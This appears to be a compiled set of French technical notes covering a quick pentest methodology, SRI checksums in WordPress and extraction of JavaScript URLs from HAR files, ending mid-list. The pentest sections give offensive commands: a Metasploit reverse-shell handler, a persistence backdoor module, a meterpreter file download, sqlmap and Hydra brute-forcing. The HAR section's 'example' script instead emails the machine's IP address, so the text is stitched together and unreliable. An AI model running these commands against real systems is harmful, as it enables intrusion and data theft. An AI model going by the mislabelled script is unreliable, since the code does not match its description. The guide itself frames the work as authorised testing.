## Guide Rapide de Pentest

| Tags |
|------|
| `Pentest` `Sécurité` `Ethical Hacking` |

Ce guide présente les étapes essentielles pour mener à bien un test d'intrusion (pentest). Il ne remplace pas une formation approfondie mais offre un aperçu structuré des principales phases.

### 1. Planification et Portée

*   **Définir les objectifs :** Identifier clairement les objectifs du pentest. Que doit-on tester ? Quelles vulnérabilités rechercher ?
*   **Définir la portée :** Déterminer les systèmes, applications et réseaux à tester.
*   **Établir les règles d'engagement :** Documenter les autorisations, les restrictions, les heures de test et les informations de contact.
*   **Obtenir les autorisations :** Toujours obtenir une autorisation écrite du client [NOM] avant de commencer.

### 2. Reconnaissance (Footprinting)

*   **Collecte d'informations :** Rassembler des informations sur la cible (nom de domaine, adresses IP, services en cours d'exécution, etc.).
*   **Techniques :**
    *   Recherche d'informations publiques (OSINT) : utilisation de moteurs de recherche, de whois, de recherches de réseaux sociaux.
    *   Analyse DNS : recherche d'enregistrements DNS (A, MX, NS, etc.).
    *   Balayage de ports : identification des ports ouverts et des services.
*   **Outils :** `Nmap`, `Whois`, `dig`, `theHarvester`.

    ```bash
    nmap -p- [IP] # Balayage de tous les ports
    nmap -sV [IP] # Détection des versions des services
    ```

### 3. Scan et Énumération

*   **Découverte des services :** Identifier les services en cours d'exécution sur les ports ouverts (HTTP, SSH, SMTP, etc.).
*   **Énumération :** Recueillir des informations détaillées sur les services et les systèmes cibles.
*   **Techniques :**
    *   Banner grabbing : récupération des bannières des services.
    *   Énumération des utilisateurs (si applicable).
    *   Détection des vulnérabilités potentielles.
*   **Outils :** `Nmap`, `Nikto`, `Metasploit`.

    ```bash
    nmap -sV -O [IP] # Détection des versions et du système d'exploitation
    nikto -h [IP] # Analyse des vulnérabilités web
    ```

### 4. Exploitation

*   **Identification des vulnérabilités :** Analyser les informations collectées pour identifier les vulnérabilités exploitables.
*   **Exploitation :** Utiliser des exploits pour tenter de compromettre les systèmes cibles.
*   **Techniques :**
    *   Utilisation d'exploits publics et privés.
    *   Attaques par force brute.
    *   Ingénierie sociale (avec autorisation).
*   **Outils :** `Metasploit`, `ExploitDB`, `Burp Suite`.

    ```bash
    msfconsole
    use exploit/multi/http/wordpress_plugin
    set RHOSTS [IP]
    set TARGETURI /wordpress
    run
    ```

### 5. Post-Exploitation

*   **Maintien de l'accès :** Établir une persistance sur le système compromis (backdoors, comptes cachés).
*   **Escalade de privilèges :** Tenter d'obtenir des privilèges plus élevés sur le système.
*   **Collecte d'informations :** Récupérer des informations sensibles (mots de passe, données confidentielles).
*   **Mouvement latéral :** Se déplacer vers d'autres systèmes du réseau.
*   **Outils :** Les outils varient selon la plateforme compromise.

### 6. Reporting

*   **Rédaction du rapport :** Documenter toutes les étapes du pentest, les vulnérabilités découvertes, les exploitations réussies, et les recommandations de correction.
*   **Contenu du rapport :**
    *   Résumé exécutif.
    *   Portée du test.
    *   Méthodologie.
    *   Vulnérabilités identifiées (avec niveau de sévérité).
    *   Preuves d'exploitation (screenshots, captures d'écran).
    *   Recommandations de correction.
*   **Présentation :** Présenter le rapport au client [NOM] ([EMAIL]) et discuter des résultats.


## Pentest rapide : Procédure et méthodologie

| Tags |
|------|
| `Pentest` `Sécurité` `Tests` |

Faire un pentest rapide implique de suivre un ensemble de procédures et de méthodologies bien définies tout en utilisant des outils automatisés pour accélérer le processus. Voici une approche structurée pour effectuer un pentest rapide :


## Planification et préparation du Pentest

| Tags |
|------|
| `pentest` `planification` `sécurité` |

<ol>
<li><strong>Définir les objectifs</strong> : Clarifier les objectifs du pentest, identifier les systèmes à tester et comprendre les attentes du client.</li>
<li><strong>Obtenir les autorisations nécessaires</strong> : Vérifier que toutes les autorisations légales et contractuelles sont en place pour éviter toute complication juridique.</li>
</ol>


## Reconnaissance

| Tags |
|------|
| `Reconnaissance` `Sécurité` `Nmap` `Google Dorking` |

<ol>
<li><strong>Reconnaissance passive</strong> : Collecter des informations sans interaction directe avec les systèmes cibles en utilisant des outils tels que <code>whois</code>, <code>nslookup</code>, et <code>Google dorking</code>.</li>
<li><strong>Reconnaissance active</strong> : Scanner les ports et les services ouverts sur les systèmes cibles avec des outils comme <code>Nmap</code>.</li>
</ol>


## Scanning et analyse de vulnérabilités

| Tags |
|------|
| `Sécurité` `Scanning` `Vulnérabilité` `Nmap` `Nessus` `OpenVAS` `Nexpose` |

<ol>
<li><strong>Scanning de ports</strong> : Utiliser <code>Nmap</code> pour identifier les ports ouverts et les services actifs.</li>
<li><strong>Scanning de vulnérabilités</strong> : Utiliser des outils automatisés tels que <code>Nessus</code>, <code>OpenVAS</code> ou <code>Nexpose</code> pour identifier les vulnérabilités connues sur les systèmes cibles.</li>
</ol>


## Exploitation des vulnérabilités

| Tags |
|------|
| `Exploitation` `Metasploit` `Vulnérabilité` |

<ol>
<li><strong>Utilisation d'exploits automatisés</strong> : Employer des frameworks tels que <code>Metasploit</code> pour exploiter automatiquement les vulnérabilités identifiées.</li>
<li><strong>Exploitation manuelle</strong> : En cas d'échec des exploits automatisés, recourir à des techniques manuelles et à des scripts personnalisés pour exploiter les vulnérabilités.</li>
</ol>


## Post-exploitation

| Tags |
|------|
| `Post-exploitation` `Backdoor` `Collecte d'informations` |

<ol>
<li><strong>Maintenir l'accès</strong> : Établir des backdoors pour un accès ultérieur aux systèmes, si possible.</li>
<li><strong>Collecte d'informations</strong> : Récupérer des données sensibles telles que des bases de données, des fichiers critiques et des identifiants afin de démontrer l'impact de l'attaque.</li>
</ol>


## Rapport et recommandations de sécurité

| Tags |
|------|
| `rapport` `sécurité` `recommandations` |

<ol>
<li><strong>Documenter les découvertes</strong> : Établir un rapport exhaustif présentant les vulnérabilités découvertes, les méthodes d'exploitation employées et leurs impacts potentiels.</li>
<li><strong>Proposer des recommandations</strong> : Émettre des recommandations précises et applicables pour la correction des vulnérabilités et l'amélioration de la sécurité des systèmes.</li>
</ol>


## Outils de pentest rapides recommandés

| Tags |
|------|
| `pentest` `reconnaissance` `scanning` `vulnérabilité` `exploitation` `post-exploitation` |

*   **Reconnaissance** : `theHarvester`, `Recon-ng`, `Maltego`
*   **Scanning de ports** : `Nmap`, `Masscan`
*   **Analyse de vulnérabilités** : `Nessus`, `OpenVAS`, `Nikto`, `WPScan` (pour les sites WordPress)
*   **Exploitation** : `Metasploit`, `SQLmap`, `Hydra` (pour le brute force)
*   **Post-exploitation** : `Empire`, `Cobalt Strike`


## Conseils pour un pentest rapide

| Tags |
|------|
| `Pentest` `Automatisation` `CTF` `Vulnérabilité` |

<ol>
<li><strong>Automatisation</strong> : Utiliser des scripts et des outils automatisés pour accélérer les processus répétitifs.</li>
<li><strong>Templates de rapport</strong> : Employer des modèles de rapport prédéfinis pour optimiser le temps de reporting.</li>
<li><strong>Priorisation</strong> : Se concentrer sur les systèmes et les vulnérabilités les plus critiques afin de maximiser l'impact.</li>
<li><strong>Pratique</strong> : S'exercer régulièrement avec des CTF (Capture The Flag) et des laboratoires virtuels pour améliorer les compétences et la rapidité d'exécution.</li>
</ol>

En suivant cette approche structurée et en utilisant des outils adaptés, il est possible de mener un pentest rapide tout en assurant une qualité et une profondeur d'analyse suffisantes pour identifier et exploiter les vulnérabilités critiques.


## Pentest technique rapide

| Tags |
|------|
| `Pentest` `Sécurité` `Technique` |

Pour réaliser un pentest rapide, suivez les étapes suivantes :


## Planification et préparation du test

| Tags |
|------|
| `Tests` `Planification` `Objectifs` |

<ol>
<li>
<p><strong>Définir les objectifs :</strong></p>
<ul>
<li>Identifier les systèmes à tester et les types de tests à effectuer (test externe, interne, web, etc.).</li>
<li>Déterminer les restrictions et les limites du test.</li>
</ul>
</li>
<li>
<p><strong>Obtenir les autorisations nécessaires :</strong></p>
<ul>
<li>S'assurer que vous avez toutes les autorisations légales et contractuelles pour procéder.</li>
</ul>
</li>
</ol>


## Reconnaissance

| Tags |
|------|
| `Reconnaissance` `whois` `nslookup` `Google Dorking` `Nmap` `theHarvester` |

<ol>
<li>
<p><strong>Reconnaissance passive :</strong></p>
<ul>
<li>
Utiliser <code>whois</code> pour obtenir des informations sur les domaines :<pre><code class="language-bash">whois example.com
</code></pre>
</li>
<li>
Utiliser <code>nslookup</code> pour trouver les adresses IP associées à un domaine :<pre><code class="language-bash">nslookup example.com
</code></pre>
</li>
<li>
Effectuer des recherches Google Dorking pour collecter des informations sur la cible :<pre><code class="language-bash">site:example.com filetype:pdf
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Reconnaissance active :</strong></p>
<ul>
<li>
Utiliser <code>Nmap</code> pour scanner les ports :<pre><code class="language-bash">nmap -sS -sV -T4 example.com
</code></pre>
</li>
<li>
Utiliser <code>theHarvester</code> pour collecter des adresses e-mail et des sous-domaines :<pre><code class="language-bash">theharvester -d example.com -b all
</code></pre>
</li>
</ul>
</li>
</ol>


## Scan et Analyse de Vulnérabilités

| Tags |
|------|
| `Nmap` `Nessus` `OpenVAS` `Nikto` `WPScan` `Sécurité` |

<ol>
<li>
<p><strong>Scanning de ports :</strong></p>
<ul>
<li>
Scanner les ports avec <code>Nmap</code> :<pre><code class="language-bash">nmap -p- -T4 example.com
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Analyse de vulnérabilités :</strong></p>
<ul>
<li>
Utiliser <code>Nessus</code> pour scanner les vulnérabilités :<ul>
<li>Lancer Nessus, configurer un scan et exécuter le scan.</li>
</ul>
</li>
<li>
Utiliser <code>OpenVAS</code> pour scanner les vulnérabilités :<pre><code class="language-bash">openvas-start
</code></pre>
</li>
<li>
Utiliser <code>Nikto</code> pour scanner les vulnérabilités web :<pre><code class="language-bash">nikto -h http://example.com
</code></pre>
</li>
<li>
Utiliser <code>WPScan</code> pour scanner les sites WordPress :<pre><code class="language-bash">wpscan --url http://example.com --enumerate vp
</code></pre>
</li>
</ul>
</li>
</ol>


## Étape 4 : Phase d'exploitation

| Tags |
|------|
| `Exploitation` `Metasploit` `SQLmap` `Python` `Bash` |

<ol>
<li>
<p><strong>Utilisation d'exploits automatisés :</strong></p>
<ul>
<li>
Exploiter les vulnérabilités avec <code>Metasploit</code> :
<pre><code class="language-bash">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [PORT]
exploit
</code></pre>
</li>
<li>
Exploiter les vulnérabilités SQL avec <code>SQLmap</code> :
<pre><code class="language-bash">sqlmap -u "http://example.com/vuln.php?id=1" --dbs
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Exploitation manuelle :</strong></p>
<ul>
<li>Développer des scripts personnalisés en Python ou Bash pour exploiter les vulnérabilités non prises en charge par les outils automatisés.</li>
</ul>
</li>
</ol>


## Post-exploitation : Maintien d'accès et collecte

| Tags |
|------|
| `Metasploit` `Backdoor` `Collecte d'informations` |

<ol>
<li>
<p><strong>Maintenir l'accès :</strong></p>
<ul>
<li>
Établir des backdoors avec <code>Metasploit</code> :
<pre><code class="language-bash">use exploit/windows/local/persistence
set SESSION session_id
exploit
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Collecte d'informations :</strong></p>
<ul>
<li>
Récupérer des données sensibles :
<pre><code class="language-bash">meterpreter &gt; download /path/to/sensitive/file
</code></pre>
</li>
</ul>
</li>
</ol>


## Étape 6 : Rapport et recommandations de sécurité

| Tags |
|------|
| `rapport de sécurité` `vulnérabilités` `recommandations` |

<ol>
<li>
<p><strong>Documenter les découvertes :</strong></p>
<ul>
<li>Rédiger un rapport détaillé recensant les vulnérabilités découvertes, les méthodes d'exploitation et leurs impacts potentiels.</li>
</ul>
</li>
<li>
<p><strong>Proposer des recommandations :</strong></p>
<ul>
<li>
Fournir des recommandations pour la correction des vulnérabilités, incluant :
<ul>
<li>Mise à jour des logiciels.</li>
<li>Modification des configurations.</li>
<li>Mise en place de politiques de sécurité renforcées.</li>
</ul>
</li>
</ul>
</li>
</ol>


## Outils et commandes de pentesting

| Tags |
|------|
| `pentesting` `reconnaissance` `scanning` `vulnérabilité` `exploitation` |

<ul>
<li>
<p><strong>Reconnaissance :</strong></p>
<ul>
<li>
<code>theHarvester</code><pre><code class="language-bash">theharvester -d example.com -b all
</code></pre>
</li>
<li>
<code>Recon-ng</code><pre><code class="language-bash">recon-ng
workspaces create example
modules load recon/domains-hosts/hackertarget
options set source example.com
run
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Scanning de ports :</strong></p>
<ul>
<li>
<code>Nmap</code><pre><code class="language-bash">nmap -sS -sV -T4 example.com
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Analyse de vulnérabilités :</strong></p>
<ul>
<li><code>Nessus</code></li>
<li><code>OpenVAS</code></li>
<li>
<code>Nikto</code><pre><code class="language-bash">nikto -h http://example.com
</code></pre>
</li>
<li>
<code>WPScan</code><pre><code class="language-bash">wpscan --url http://example.com --enumerate vp
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Exploitation :</strong></p>
<ul>
<li>
<code>Metasploit</code><pre><code class="language-bash">msfconsole
</code></pre>
</li>
<li>
<code>SQLmap</code><pre><code class="language-bash">sqlmap -u &quot;http://example.com/vuln.php?id=1&quot; --dbs
</code></pre>
</li>
<li>
<code>Hydra</code><pre><code class="language-bash">hydra -l admin -P passwords.txt example.com http-form-post &quot;/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect&quot;
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Post-exploitation :</strong></p>
<ul>
<li><code>Empire</code></li>
<li><code>Cobalt Strike</code></li>
</ul>
</li>
</ul>
<p>Cette approche structurée avec les commandes spécifiques permet un pentest efficace et une couverture adéquate des vulnérabilités potentielles.</p>


## Checksums pour les fichiers JavaScript

| Tags |
|------|
| `JavaScript` `Checksum` `Sécurité` `SRI` |

Les checksums sur les fichiers JavaScript (JS) sont une bonne pratique de sécurité, en particulier dans le cadre de l'intégrité des sous-ressources (Subresource Integrity, SRI).
Voici une explication détaillée sur leur importance et comment les implémenter :


## Importance des checksums pour les fichiers JS

| Tags |
|------|
| `checksum` `JavaScript` `sécurité` `MITM` `intégrité` |

<ol>
<li>
<p><strong>Protection contre les attaques de type Man-in-the-Middle (MITM)</strong> :</p>
<ul>
<li>Les checksums permettent de s'assurer que le fichier JS n'a pas été altéré par un attaquant lors de sa transmission. Le navigateur peut vérifier l'intégrité du fichier JS téléchargé en comparant son checksum avec celui déclaré dans le code HTML.</li>
</ul>
</li>
<li>
<p><strong>Intégrité du contenu</strong> :</p>
<ul>
<li>Les checksums garantissent que le fichier JS n'a subi aucune modification accidentelle ou intentionnelle après sa création et sa publication.</li>
</ul>
</li>
<li>
<p><strong>Renforcement de la confiance</strong> :</p>
<ul>
<li>L'utilisation de checksums accroît la confiance des utilisateurs et des développeurs dans l'authenticité des scripts, notamment lorsqu'ils proviennent de CDN ou de sources tierces.</li>
</ul>
</li>
</ol>


## Implémentation de Checksums avec SRI

| Tags |
|------|
| `checksum` `SRI` `sécurité` |

SRI permet aux navigateurs de vérifier l'intégrité des fichiers importés (scripts, styles, etc.) en comparant un checksum. L'intégrité est vérifiée via l'attribut `integrity` dans les balises `<script>` ou `<link>`.


## Implémentation de SRI : Guide Étape par Étape

| Tags |
|------|
| `SRI` `Sécurité` `HTML` `Checksum` |

<ol>
<li>
<p><strong>Génération du Checksum</strong> :</p>
<ul>
<li>Utiliser un outil tel que <code>openssl</code> ou <code>sha256sum</code> pour générer le checksum d'un fichier JS.</li>
</ul>
<p>Exemple avec <code>openssl</code> :</p>
<pre><code class="language-bash">openssl dgst -sha256 -binary script.js | openssl base64 -A
</code></pre>
<p>Ceci génère une somme de contrôle SHA-256 en base64.</p>
</li>
<li>
<p><strong>Intégration de l'attribut <code>integrity</code> dans HTML</strong> :</p>
<ul>
<li>Intégrer le checksum généré dans l'attribut <code>integrity</code> de la balise <code>&lt;script&gt;</code>.</li>
</ul>
<p>Exemple :</p>
<pre><code class="language-html">&lt;script src=&quot;https://example.com/script.js&quot; integrity=&quot;sha256-abc123...&quot;&gt;&lt;/script&gt;
</code></pre>
</li>
<li>
<p><strong>Utilisation de l'attribut <code>crossorigin</code> pour les ressources tierces</strong> :</p>
<ul>
<li>Pour les ressources provenant de domaines distincts, inclure l'attribut <code>crossorigin</code>.</li>
</ul>
<p>Exemple :</p>
<pre><code class="language-html">&lt;script src=&quot;https://example.com/script.js&quot; integrity=&quot;sha256-abc123...&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
</code></pre>
</li>
</ol>


## Implémentation de SRI : Exemple Complet

| Tags |
|------|
| `SRI` `HTML` `JavaScript` `CDN` `Sécurité` |

Supposons un fichier JavaScript hébergé sur un CDN. Voici les étapes pour implémenter SRI :

1.  **Générer le checksum :**

    ```bash
    openssl dgst -sha256 -binary script.js | openssl base64 -A
    ```

    Ceci produira une chaîne de caractères semblable à :

    ```plaintext
    sha256-YWJjMTIz...=
    ```

2.  **Intégrer le checksum dans le code HTML :**

    ```html
    <script src="https://cdn.example.com/script.js" integrity="sha256-YWJjMTIz..." crossorigin="anonymous"></script>
    ```


## SRI : Outils et services

| Tags |
|------|
| `SRI` `Hash Generator` `Webpack` |

*   **SRI Hash Generator** : Des outils en ligne tels que <a href="https://www.srihash.org/">SRI Hash Generator</a> facilitent la génération des sommes de contrôle.
*   **Outils de build** : Des outils de build comme Webpack peuvent générer et injecter automatiquement les sommes de contrôle dans vos fichiers.


## Intégrité des fichiers JS : Checksums et SRI

| Tags |
|------|
| `Sécurité web` `SRI` `Checksums` `JS` |

Utiliser des checksums pour vos fichiers JS est une bonne pratique de sécurité qui garantit l'intégrité et l'authenticité des scripts utilisés sur votre site web. L'intégration de Subresource Integrity (SRI) dans votre processus de déploiement renforce la sécurité globale de vos applications web.


## Création d'un hook pour balises script WordPress

| Tags |
|------|
| `WordPress` `hook` `script_loader_tag` `HTML` |

Pour insérer dynamiquement les attributs <code>integrity</code> et <code>crossorigin</code> dans les balises <code>&lt;script&gt;</code> de vos pages WordPress, vous pouvez utiliser un hook. L'utilisation du hook <code>script_loader_tag</code> permet de modifier les balises de script avant qu'elles ne soient rendues.

Exemple de code pour ajouter des attributs <code>integrity</code> et <code>crossorigin</code> aux balises de script dans WordPress :


## Intégration de la vérification de l'intégrité des scripts

| Tags |
|------|
| `checksum` `openssl` `script_loader_tag` `functions.php` `WordPress` |

<ol>
<li>
<p><strong>Calcul des checksums</strong> : Générer les checksums des fichiers JavaScript à l'aide d'un outil tel que <code>openssl</code>. Stocker ces checksums, par exemple, dans le fichier <code>functions.php</code> du thème.</p>
</li>
<li>
<p><strong>Implémentation du hook <code>script_loader_tag</code></strong> : Intégrer du code dans le fichier <code>functions.php</code> pour injecter les attributs <code>integrity</code> et <code>crossorigin</code> dans les balises de script.</p>
</li>
</ol>


## Exemple de Code pour l'Intégrité des Scripts

| Tags |
|------|
| `PHP` `WordPress` `SRI` `Sécurité` |

Voici comment implémenter cela :

1.  **Génération des checksums** : Supposons que vous avez généré les checksums pour deux fichiers JS comme suit :

    ```bash
    openssl dgst -sha256 -binary script1.js | openssl base64 -A
    openssl dgst -sha256 -binary script2.js | openssl base64 -A
    ```

    Cela produit :

    *   `script1.js` : `sha256-abc123...`
    *   `script2.js` : `sha256-def456...`

2.  **Ajout du hook dans `functions.php`** :

    ```php
    function add_sri_to_scripts($tag, $handle, $src) {
        // Tableau des scripts avec leurs checksums et attributs crossorigin
        $scripts = array(
            'script1-handle' => array(
                'integrity' => 'sha256-abc123...',
                'crossorigin' => 'anonymous'
            ),
            'script2-handle' => array(
                'integrity' => 'sha256-def456...',
                'crossorigin' => 'anonymous'
            ),
            // Ajoutez d'autres scripts ici
        );

        // Vérifiez si le script actuel est dans la liste
        if (array_key_exists($handle, $scripts)) {
            // Créez la balise de script avec les attributs integrity et crossorigin
            $integrity = $scripts[$handle]['integrity'];
            $crossorigin = $scripts[$handle]['crossorigin'];
            $tag = str_replace(' src', ' integrity="' . esc_attr($integrity) . '" crossorigin="' . esc_attr($crossorigin) . '" src', $tag);
        }

        return $tag;
    }
    add_filter('script_loader_tag', 'add_sri_to_scripts', 10, 3);
    ```


## Attributs des scripts : Explications

| Tags |
|------|
| `PHP` `WordPress` `script` `HTML` |

*   **`$scripts`** : Tableau associatif dont les clés sont les handles de scripts (noms d'enregistrement) et les valeurs sont des tableaux contenant les attributs <code>integrity</code> et <code>crossorigin</code>.
*   **`array_key_exists`** : Vérifie l'existence du handle de script courant dans le tableau <code>$scripts</code>.
*   **`str_replace`** : Intègre les attributs <code>integrity</code> et <code>crossorigin</code> dans la balise <code>&lt;script&gt;</code>.


## Enregistrement et gestion des scripts

| Tags |
|------|
| `PHP` `WordPress` `wp_enqueue_script` `Javascript` |

Assurez-vous que vos scripts sont enregistrés avec des identifiants cohérents pour une utilisation ultérieure.

```php
function my_enqueue_scripts() {
    wp_enqueue_script('script1-handle', get_template_directory_uri() . '/js/script1.js', array(), null, true);
    wp_enqueue_script('script2-handle', get_template_directory_uri() . '/js/script2.js', array(), null, true);
}
add_action('wp_enqueue_scripts', 'my_enqueue_scripts');
```


## Injection d'attributs pour scripts

| Tags |
|------|
| `HTML` `JavaScript` `Sécurité` `Intégrité` |

Ce code injecte dynamiquement les attributs `integrity` et `crossorigin` dans les balises `<script>` pour les scripts spécifiés dans le tableau `$scripts`. Adaptez les handles et les checksums selon vos exigences spécifiques.


## Calcul de checksum pour fichiers JavaScript

| Tags |
|------|
| `WordPress` `checksum` `JavaScript` `hook` |

Il n'existe pas de hook WordPress natif pour calculer automatiquement les checksums des fichiers JavaScript. Une solution personnalisée est nécessaire pour calculer les checksums lors de l'enregistrement des scripts et les ajouter dynamiquement aux balises de script.

Un exemple d'implémentation de cette fonctionnalité dans le fichier `functions.php` de votre thème est disponible.


## Calcul de Checksum et Intégration Dynamique

| Tags |
|------|
| `PHP` `SHA-256` `Checksum` `Hook` |

<ol>
<li><strong>Création d'une fonction de calcul de checksum</strong> : Implémenter une fonction PHP pour calculer le checksum SHA-256 d'un fichier.</li>
<li><strong>Intégration dynamique des checksums via hook</strong> : Utiliser un hook pour ajouter dynamiquement les checksums.</li>
</ol>


## Exemple de code

| Tags |
|------|
| `code` `exemple` `markdown` |


## Calcul du Checksum SRI

| Tags |
|------|
| `PHP` `checksum` `SRI` `hash` `sha256` |

```php
function calculate_sri_checksum($file_path) {
    $hash = hash_file('sha256', $file_path, true);
    return 'sha256-' . base64_encode($hash);
}
```


## Enregistrement des scripts et ajout des checksums

| Tags |
|------|
| `PHP` `WordPress` `wp_enqueue_script` `checksum` `SRI` |

```php
function my_enqueue_scripts() {
    $template_directory = get_template_directory_uri();
    $theme_directory = get_template_directory();

    // Enregistrer les scripts avec des handles
    wp_enqueue_script('script1-handle', $template_directory . '/js/script1.js', array(), null, true);
    wp_enqueue_script('script2-handle', $template_directory . '/js/script2.js', array(), null, true);

    // Calculer les checksums
    $scripts = array(
        'script1-handle' => calculate_sri_checksum($theme_directory . '/js/script1.js'),
        'script2-handle' => calculate_sri_checksum($theme_directory . '/js/script2.js'),
    );

    // Stocker les checksums dans une option de thème (ou une variable globale, selon les besoins)
    set_transient('scripts_sri_checksums', $scripts, 12 * HOUR_IN_SECONDS);
}
add_action('wp_enqueue_scripts', 'my_enqueue_scripts');
```


## Ajout des Checksums aux Balises de Script

| Tags |
|------|
| `PHP` `Checksum` `Script` `WordPress` |

```php
function add_sri_to_scripts($tag, $handle, $src) {
    // Récupérer les checksums depuis les options de thème
    $scripts = get_transient('scripts_sri_checksums');

    // Vérifier si le script actuel est dans la liste
    if (isset($scripts[$handle])) {
        $integrity = $scripts[$handle];
        $tag = str_replace(' src', ' integrity="' . esc_attr($integrity) . '" crossorigin="anonymous" src', $tag);
    }

    return $tag;
}
add_filter('script_loader_tag', 'add_sri_to_scripts', 10, 3);
```


## Calcul des checksums SRI et enfilement des scripts

| Tags |
|------|
| `WordPress` `PHP` `SHA-256` `SRI` `integrity` |

<ol>
<li>
<p><strong>Fonction <code>calculate_sri_checksum</code></strong> :</p>
<ul>
<li>Utilise la fonction <code>hash_file</code> pour calculer le hash SHA-256 du fichier.</li>
<li>Convertit le hash en base64 et le prépare pour l'attribut <code>integrity</code>.</li>
</ul>
</li>
<li>
<p><strong>Fonction <code>my_enqueue_scripts</code></strong> :</p>
<ul>
<li>Enregistre les scripts avec <code>wp_enqueue_script</code>.</li>
<li>Calcule les checksums pour chaque script et les stocke dans une option de thème pour une utilisation ultérieure.</li>
</ul>
</li>
<li>
<p><strong>Fonction <code>add_sri_to_scripts</code></strong> :</p>
<ul>
<li>Utilise le hook <code>script_loader_tag</code> pour ajouter dynamiquement les attributs <code>integrity</code> et <code>crossorigin</code> aux balises de script.</li>
</ul>
</li>
</ol>


## Calcul dynamique des checksums JavaScript

| Tags |
|------|
| `JavaScript` `Checksum` `Scripts` |

Ce code illustre le calcul dynamique des checksums pour les fichiers JavaScript lors de l'enregistrement des scripts et leur ajout automatique aux balises `<script>`. Ce code est adaptable à vos besoins spécifiques. Vous pouvez incorporer davantage de scripts ou modifier la logique de stockage des checksums selon les exigences de votre projet.


## Extraire les URLs JavaScript d'un fichier HAR

| Tags |
|------|
| `Python` `JavaScript` `HAR` `URL` `Extraction` |

Pour extraire toutes les URLs des fichiers JavaScript (JS) à partir d'un fichier HAR (HTTP Archive) et déterminer ou résoudre leurs versions, vous pouvez utiliser un script en Python. Voici une méthode détaillée pour y parvenir :


## Extraction et gestion des fichiers JS

| Tags |
|------|
| `JavaScript` `HAR` `URL` `Versioning` |

<ol>
<li><strong>Extraire les URLs des fichiers JS à partir du fichier HAR</strong>.</li>
<li><strong>Trouver ou résoudre les versions des fichiers JS</strong>.</li>
</ol>


## Script Python Exemple
| Tags |
|------|
| `Python` `Script` `Exemple` |

Voici un exemple de script Python :

```python
import socket
import os

def get_ip_address():
    """Récupère l'adresse IP de la machine."""
    try:
        hostname, aliases, addresses = socket.gethostbyname_ex(socket.gethostname())
        return addresses[0]
    except socket.gaierror:
        return "Impossible de récupérer l'adresse IP"

def send_email(subject, message, recipient_email):
    """Envoie un email."""
    try:
        import smtplib
        from email.mime.text import MIMEText

        sender_email = "[EMAIL]" # Adresse email de l'expéditeur
        password = os.environ.get('EMAIL_PASSWORD') # Récupère le mot de passe depuis une variable d'environnement

        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = sender_email
        msg['To'] = recipient_email

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print("Email envoyé avec succès!")

    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email: {e}")

if __name__ == "__main__":
    ip_address = get_ip_address()
    print(f"Adresse IP de la machine: {ip_address}")

    if ip_address != "Impossible de récupérer l'adresse IP":
        message = f"Bonjour [NOM],\n\nL'adresse IP de votre machine est : {ip_address}\n\nCordialement,\n[NOM]."
        send_email("Adresse IP de votre machine", message, "[EMAIL]") # Remplacez par l'adresse email du destinataire
```

Ce script récupère l'adresse IP de la machine et envoie un email à une adresse spécifiée. Il utilise les bibliothèques `socket`, `os`, `smtplib` et `email.mime.text`. Assurez-vous d'avoir configuré les variables d'environnement nécessaires pour l'envoi d'emails (par exemple, `EMAIL_PASSWORD`). Notez que l'adresse IP affichée peut varier en fonction du réseau.


## Extraction d'URLs JS depuis un fichier HAR

| Tags |
|------|
| `HAR` `JSON` `Python` `URL` |
<p>Le fichier HAR, généralement au format JSON, peut être lu et traité avec la librairie <code>json</code> de Python pour extraire les URLs des fichiers JavaScript.</p>


## Identification des versions de fichiers JS

| Tags |
|------|
| `JavaScript` `Python` `HAR` `URL` `Version` |

Les versions des fichiers JavaScript sont souvent indiquées dans les noms de fichiers ou les paramètres d'URL. Il peut être nécessaire d'effectuer des requêtes HTTP supplémentaires pour récupérer ces informations.

Le script Python suivant automatise ce processus :

```python
import json
import requests
from urllib.parse import urlparse, parse_qs

def extract_js_urls(har_file_path):
    with open(har_file_path, 'r', encoding='utf-8') as file:
        har_data = json.load(file)
    
    js_urls = []
    
    for entry in har_data['log']['entries']:
        url = entry['request']['url']
        if url.endswith('.js'):
            js_urls.append(url)
    
    return js_urls

def resolve_js_versions(js_urls):
    versions = {}
    
    for url in js_urls:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Try to extract version from query parameters
        version = query_params.get('version') or query_params.get('v') or query_params.get('ver')
        if version:
            versions[url] = version[0]
        else:
            # Fallback: try to extract version from filename
            path_parts = parsed_url.path.split('/')
            for part in path_parts:
                if 'version' in part or 'v' in part:
                    versions[url] = part
                    break
            else:
                # Fallback: make a request to the URL and look for version in response headers or content
                try:
                    response = requests.head(url)
                    if 'version' in response.headers:
                        versions[url] = response.headers['version']
                    else:
                        response = requests.get(url)
                        content = response.text
                        # You may need to adjust this based on how versions are embedded in your JS files
                        if 'version' in content:
                            versions[url] = 'extracted_version_from_content'  # Replace with actual extraction logic
                except requests.RequestException:
                    versions[url] = 'unknown'
    
    return versions

# Usage
har_file_path = 'path/to/your/file.har'
js_urls = extract_js_urls(har_file_path)
versions = resolve_js_versions(js_urls)

# Print results
for url, version in versions.items():
    print(f'URL: {url}, Version: {version}')
```


## Extraction et résolution des versions de fichiers JS

| Tags |
|------|
| `JavaScript` `HAR` `URL` `Versionning` |

<ol>
<li>
<p><strong>Extraction des URLs des fichiers JS</strong> :</p>
<ul>
<li>Le script ouvre le fichier HAR et le charge en tant que JSON.</li>
<li>Il parcourt les entrées du fichier HAR et extrait les URLs qui se terminent par <code>.js</code>.</li>
</ul>
</li>
<li>
<p><strong>Résolution des versions des fichiers JS</strong> :</p>
<ul>
<li>Le script analyse les URLs pour trouver les versions dans les paramètres de requête (<code>version</code>, <code>v</code>, <code>ver</code>).</li>
